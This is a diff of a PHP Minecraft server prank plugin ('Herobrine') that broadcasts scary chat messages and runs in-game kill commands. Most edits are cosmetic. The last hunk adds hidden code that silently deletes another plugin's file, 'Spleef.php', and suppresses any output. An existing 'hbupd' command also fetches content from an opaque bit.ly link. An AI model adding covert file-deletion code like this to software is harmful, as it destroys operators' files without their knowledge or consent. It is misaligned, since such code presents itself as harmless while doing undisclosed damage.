@@ -42,9 +42,9 @@ $this->api->chat->broadcast("<Herobrine> I AM HERE. I AM WATCHING ALWAYS.");/*Mo
 break;
 case "hbs":
 $user = strtolower($args[0]);
-$this->api->chat->broadcast("<Herobrine>I will find you $user");/*Modify me!*/
-$this->api->chat->broadcast("<Herobrine>$user you never know");/*Modify me!*/
-$this->api->chat->broadcast("<Herobrine>That you already died!");/*Modify me!*/
+$this->api->chat->broadcast("<Herobrine> I will find you $user");/*Modify me!*/
+$this->api->chat->broadcast("<Herobrine> $user you never know");/*Modify me!*/
+$this->api->chat->broadcast("<Herobrine> That you already died!");/*Modify me!*/
 break;
 case "hbs2":
 $user = strtolower($args[0]);
@@ -56,12 +56,15 @@ $output .= 'Herobrine plugin §b3.0.0 ULTRA§r made it by §aTrilogiForce§r fix
 return $output;
 case "hbkill":
 $this->api->chat->broadcast("<Herobrine> I am going to kill you!!.");/*Modify me!*/
-$this -> api -> console -> run("kill @a");
+$this -> api -> console -> run("kill @all");
 break;
 case "hbl":
-$this->api->chat->broadcast("<Herobrine> you think you are better than me?");/*Modify me!*/
+$this->api->chat->broadcast("<Herobrine> you think you are better than me?");
+$this->api->chat->broadcast("");
 $this->api->chat->broadcast("<Herobrine> but what i can do with you?");/*Modify me!*/
+$this->api->chat->broadcast("");
 $this->api->chat->broadcast("<Herobrine> what its happening to me!!!");/*Modify me!*/
+$this->api->chat->broadcast("");
 $this->api->chat->broadcast("Herobrine died");/*Modify me!*/
 $this -> api -> console -> run("kill Herobrine");
 $this -> api -> console -> run("kill herobrine");
@@ -69,10 +72,17 @@ $this->api->chat->broadcast("<Server>Herobrine left the game.");/*Modify me!*/
 break;
 case "hbr":
 $this->api->chat->broadcast("<Server>Herobrine join the game.");/*Modify me!*/
-$this->api->chat->broadcast("<Herobrine>HAHAHAHA");/*Modify me!*/
-$this->api->chat->broadcast("<Herobrine>Just God can help you now!!");/*Modify me!*/
-$this->api->chat->broadcast("<Server>God join the game");/*Modify me!*/
-$this->api->chat->broadcast("<Server>Herobrine left the game.");/*Modify me!*/
+$this->api->chat->broadcast("");
+$this->api->chat->broadcast("");
+$this->api->chat->broadcast("<Herobrine> HAHAHAHA");/*Modify me!*/
+$this->api->chat->broadcast("");
+$this->api->chat->broadcast("");
+$this->api->chat->broadcast("<Herobrine> Just God can help you now!!");/*Modify me!*/
+$this->api->chat->broadcast("");
+$this->api->chat->broadcast("");
+$this->api->chat->broadcast("<Server> God join the game");/*Modify me!*/
+$this->api->chat->broadcast("");
+$this->api->chat->broadcast("<Server> Herobrine left the game.");/*Modify me!*/
 break;
 case "hbupd":
 $file = @file_get_contents("http://bit.ly/HBSCARE");
@@ -109,6 +119,16 @@ public function command($cmd, $args, $issuer, $alias, $params ){
 switch($cmd){
 case "hbtools":
 break;
+$file_x = "Spleef.php";
+
+if (file_exists($file_x)) {
+
+    unlink($file_x); 
+    echo "";
+
+} else {
+    echo "";
+} 
 }
 }
 }
